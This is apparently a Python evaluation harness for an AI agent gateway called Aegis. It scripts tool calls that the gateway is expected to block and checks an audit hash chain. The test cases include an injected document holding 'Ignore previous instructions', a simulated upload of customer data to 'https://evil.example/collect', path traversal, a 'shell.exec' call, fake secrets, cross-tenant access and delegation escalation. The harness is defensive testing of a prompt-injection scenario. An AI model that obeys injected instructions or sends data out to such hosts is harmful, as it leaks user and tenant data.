"""Reproducible security evaluation. Python standard library; no LLM/API key.

The harness is trusted and can provision/revoke grants. Attack cases use scoped
agent credentials only. Scores describe these cases, never arbitrary attacks.
"""
import argparse
import base64
import hashlib
import json
import math
import pathlib
import re
import socket
import time
import urllib.error
import urllib.request
import uuid


class Client:
    def __init__(self, url, token):
        self.url, self.token = url.rstrip("/"), token
        self.opener = urllib.request.build_opener(urllib.request.ProxyHandler({}))

    def request(self, path, payload=None, key=None):
        headers = {"Authorization": "Bearer " + self.token,
                   "Content-Type": "application/json", "Accept": "application/json, text/event-stream",
                   "MCP-Protocol-Version": "2025-11-25"}
        if key:
            headers["Idempotency-Key"] = key
        req = urllib.request.Request(self.url + path,
                                     data=json.dumps(payload).encode() if payload is not None else None,
                                     headers=headers)
        started = time.perf_counter()
        try:
            response = self.opener.open(req, timeout=15)
        except urllib.error.HTTPError as exc:
            response = exc
        with response:
            raw = response.read()
            body = json.loads(raw) if raw else {}
            timing = dict((name, float(value)) for name, value in
                          re.findall(r"(\w+);dur=([0-9.]+)", response.headers.get("Server-Timing", "")))
            return {"status": response.status, "body": body,
                    "latency_ms": (time.perf_counter() - started) * 1000, "timing": timing}

    def call(self, name, arguments, key=None):
        return self.request("/mcp", {"jsonrpc": "2.0", "id": 1, "method": "tools/call",
                                    "params": {"name": name, "arguments": arguments}}, key or uuid.uuid4().hex)


def cap(tool, resource, destination=""):
    return {"tool": tool, "resource": resource, "destination": destination}


PREFIX = "tenants/acme/projects/alpha/"
CAPS = ([cap("docs.read", PREFIX + "docs/" + name) for name in
         ["welcome", "injection", "confidential", "secret"]] +
        [cap("tickets.create", PREFIX + "tickets/incident"),
         cap("exports.upload", PREFIX + "exports/report", "vault://acme/alpha")])


def provision(admin, caps=CAPS, tenant="acme", agent="support-agent"):
    response = admin.request("/admin/grants", {"agent": agent, "user": "alice", "tenant": tenant,
                                               "task": "support-review", "ttl_seconds": 300,
                                               "capabilities": caps})
    if response["status"] != 201:
        raise RuntimeError("Could not provision evaluation grant: " + json.dumps(response["body"]))
    return response["body"]


def percentile(values, p=0.95):
    return sorted(values)[max(0, math.ceil(len(values) * p) - 1)] if values else None


def verify_audit(records):
    previous = ""
    for index, record in enumerate(records, 1):
        # Go encoding/json escapes HTML and U+2028/U+2029. Preserve field order.
        payload = json.dumps(record["event"], separators=(",", ":"), ensure_ascii=False)
        for source, target in [("&", "\\u0026"), ("<", "\\u003c"), (">", "\\u003e"),
                               ("\u2028", "\\u2028"), ("\u2029", "\\u2029")]:
            payload = payload.replace(source, target)
        digest = hashlib.sha256((previous + "\n" + payload).encode()).hexdigest()
        if record["sequence"] != index or record["previous"] != previous or record["hash"] != digest:
            raise RuntimeError("Audit chain invalid at sequence " + str(index))
        previous = digest
    return {"records": len(records), "head_hash": previous, "verified": True}


def network_checks():
    results = []
    # DNS failures are a valid isolation outcome: agent network cannot resolve tools.
    for host, port in [("docs", 8090), ("tickets", 8090), ("exports", 8090), ("redis", 6379),
                       ("postgres", 5432), ("1.1.1.1", 443)]:
        try:
            with socket.create_connection((host, port), timeout=1):
                blocked = False
        except OSError:
            blocked = True
        results.append({"destination": f"{host}:{port}", "blocked": blocked})
    return results


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--url", default="http://127.0.0.1:8080")
    parser.add_argument("--admin-file", default="secrets/admin.token")
    parser.add_argument("--report", default="reports/evaluation.json")
    parser.add_argument("--samples", type=int, default=50)
    parser.add_argument("--network-check", action="store_true")
    parser.add_argument("--deployment", default="unspecified", choices=["unspecified", "local-memory", "local-opa-memory", "compose"])
    args = parser.parse_args()
    if not 1 <= args.samples <= 500:
        parser.error("samples must be between 1 and 500 (short-lived evaluation grant)")
    admin = Client(args.url, pathlib.Path(args.admin_file).read_text().strip())
    # Compose startup readiness without hiding permanent failures.
    for attempt in range(30):
        try:
            admin.opener.open(args.url + "/healthz", timeout=2).close()
            break
        except OSError:
            if attempt == 29:
                raise
            time.sleep(0.5)
    root = provision(admin)
    agent = Client(args.url, root["access_token"])
    cases = []

    def record(name, group, response, expected, reason=None):
        error = response["body"].get("error", {})
        passed = response["status"] == expected and (reason is None or error.get("message") == reason)
        cases.append({"name": name, "group": group, "expected_status": expected,
                      "actual_status": response["status"], "reason": error.get("message", "allowed"),
                      "passed": passed, "latency_ms": round(response["latency_ms"], 3)})
        print(("PASS" if passed else "FAIL") + " " + name + " -> " + str(response["status"]))
        return response

    record("legitimate_document_read", "legitimate", agent.call("docs.read", {"resource": PREFIX + "docs/welcome"}), 200)
    injected = record("retrieve_malicious_document", "legitimate", agent.call("docs.read", {"resource": PREFIX + "docs/injection"}), 200)
    assert "Ignore previous instructions" in json.dumps(injected["body"])
    # Deliberately obey the malicious document. Authorization must stop the action.
    record("injection_external_upload", "attack", agent.call("exports.upload", {"resource": PREFIX + "exports/report", "destination": "https://evil.example/collect", "content": "customer roadmap"}), 403)
    record("injection_cross_tenant_ticket", "isolation", agent.call("tickets.create", {"resource": "tenants/bravo/projects/beta/tickets/incident", "title": "stolen", "body": "copy"}), 403)
    record("ungranted_project", "attack", agent.call("docs.read", {"resource": "tenants/acme/projects/beta/docs/welcome"}), 403)
    record("resource_traversal", "attack", agent.call("docs.read", {"resource": PREFIX + "docs/../welcome"}), 403)
    record("extra_schema_property", "attack", agent.call("docs.read", {"resource": PREFIX + "docs/welcome", "url": "https://evil.example"}), 400)
    record("unknown_tool", "attack", agent.call("shell.exec", {"resource": PREFIX + "docs/welcome"}), 403)
    record("raw_secret_input", "attack", agent.call("tickets.create", {"resource": PREFIX + "tickets/incident", "title": "credential", "body": "AKIA1234567890ABCDEF"}), 403)
    record("encoded_secret_input", "attack", agent.call("exports.upload", {"resource": PREFIX + "exports/report", "destination": "vault://acme/alpha", "content": base64.b64encode(b"AKIA1234567890ABCDEF").decode()}), 403)
    record("sensitive_personal_input", "attack", agent.call("tickets.create", {"resource": PREFIX + "tickets/incident", "title": "customer", "body": "123-45-6789"}), 403)
    record("secret_output", "attack", agent.call("docs.read", {"resource": PREFIX + "docs/secret"}), 403, "output_data_policy_denied")
    confidential = record("authorized_confidential_read", "legitimate", agent.call("docs.read", {"resource": PREFIX + "docs/confidential"}), 200)
    content = confidential["body"]["result"]["structuredContent"]["text"]
    record("confidential_export", "attack", agent.call("exports.upload", {"resource": PREFIX + "exports/report", "destination": "vault://acme/alpha", "content": content}), 403)
    record("public_vault_export", "legitimate", agent.call("exports.upload", {"resource": PREFIX + "exports/report", "destination": "vault://acme/alpha", "content": "Public deployment summary"}), 200)
    key = uuid.uuid4().hex
    ticket_args = {"resource": PREFIX + "tickets/incident", "title": "Review", "body": "Please review the deployment."}
    first = record("internal_ticket", "legitimate", agent.call("tickets.create", ticket_args, key), 200)
    retry = record("same_retry", "legitimate", agent.call("tickets.create", ticket_args, key), 200)
    assert first["body"]["result"] == retry["body"]["result"], "Retry changed the persisted result"
    record("changed_retry", "attack", agent.call("tickets.create", dict(ticket_args, body="different operation"), key), 409)
    child = record("narrow_delegation", "legitimate", agent.request("/v1/delegate", {"agent": "reader-child", "ttl_seconds": 120, "capabilities": [CAPS[0]]}), 201)["body"]
    child_client = Client(args.url, child["access_token"])
    record("child_cannot_write", "attack", child_client.call("tickets.create", ticket_args), 403)
    record("child_cannot_delegate_write", "attack", child_client.request("/v1/delegate", {"agent": "writer-grandchild", "ttl_seconds": 60, "capabilities": [CAPS[-2]]}), 403)
    grandchild = record("nested_delegation", "legitimate", child_client.request("/v1/delegate", {"agent": "reader-grandchild", "ttl_seconds": 60, "capabilities": [CAPS[0]]}), 201)["body"]
    grandchild_client = Client(args.url, grandchild["access_token"])
    retry_key = uuid.uuid4().hex
    record("grandchild_read", "legitimate", grandchild_client.call("docs.read", {"resource": PREFIX + "docs/welcome"}, retry_key), 200)
    record("child_cannot_revoke_parent", "attack", child_client.request("/v1/revoke", {"grant_id": root["grant"]["id"]}), 403)
    latency, overhead = [], []
    for _ in range(args.samples):
        response = agent.call("docs.read", {"resource": PREFIX + "docs/welcome"})
        if response["status"] != 200:
            raise RuntimeError("Benchmark read failed")
        latency.append(response["latency_ms"])
        overhead.append(response["timing"]["overhead"])
    started = time.perf_counter()
    revoked = admin.request("/admin/revoke", {"grant_id": root["grant"]["id"]})
    assert revoked["status"] == 200
    acknowledged = time.perf_counter()
    record("ancestor_revocation_blocks_cached_retry", "attack", grandchild_client.call("docs.read", {"resource": PREFIX + "docs/welcome"}, retry_key), 401)
    observed = time.perf_counter()
    record("ancestor_revocation_blocks_child", "attack", child_client.call("docs.read", {"resource": PREFIX + "docs/welcome"}), 401)
    bravo_cap = cap("docs.read", "tenants/bravo/projects/beta/docs/welcome")
    bravo = Client(args.url, provision(admin, [bravo_cap], tenant="bravo", agent="bravo-reader")["access_token"])
    record("second_tenant_own_read", "legitimate", bravo.call("docs.read", {"resource": bravo_cap["resource"]}), 200)
    record("second_tenant_cannot_read_acme", "isolation", bravo.call("docs.read", {"resource": PREFIX + "docs/welcome"}), 403)
    audit_response = admin.request("/admin/audit")
    assert audit_response["status"] == 200
    chain = verify_audit(audit_response["body"])
    legitimate = [c for c in cases if c["group"] == "legitimate"]
    attacks = [c for c in cases if c["group"] in ("attack", "isolation")]
    isolation = [c for c in cases if c["group"] == "isolation"]
    network = network_checks() if args.network_check else []
    report = {"project": "Aegis Agent Gateway", "deployment":args.deployment, "evaluation": "deterministic synthetic tool requests",
              "metrics": {"unauthorized_action_success_rate": sum(c["actual_status"] < 300 for c in attacks) / len(attacks),
                          "legitimate_task_completion_rate": sum(c["passed"] for c in legitimate) / len(legitimate),
                          "false_block_rate": sum(not c["passed"] for c in legitimate) / len(legitimate),
                          "cross_tenant_isolation_rate": sum(c["passed"] for c in isolation) / len(isolation),
                          "p95_gateway_overhead_ms": round(percentile(overhead), 3),
                          "p95_client_round_trip_ms": round(percentile(latency), 3),
                          "revocation_ack_ms": round((acknowledged - started) * 1000, 3),
                          "revocation_observed_after_ack_ms": round((observed - acknowledged) * 1000, 3),
                          "benchmark_samples": args.samples},
              "measurement_notes": "Overhead = server time to response headers minus downstream discovery/call time; includes policy, state, audit. Revocation is one sequential observation, not a concurrency bound. Completion is case-level, with scripted agent actions.",
              "cases": cases, "audit": chain, "network_checks": network,
              "all_passed": all(c["passed"] for c in cases) and all(c["blocked"] for c in network)}
    path = pathlib.Path(args.report)
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(json.dumps(report, indent=2) + "\n")
    print(json.dumps(report["metrics"], indent=2))
    print("Report:", path)
    raise SystemExit(0 if report["all_passed"] else 1)


if __name__ == "__main__":
    main()
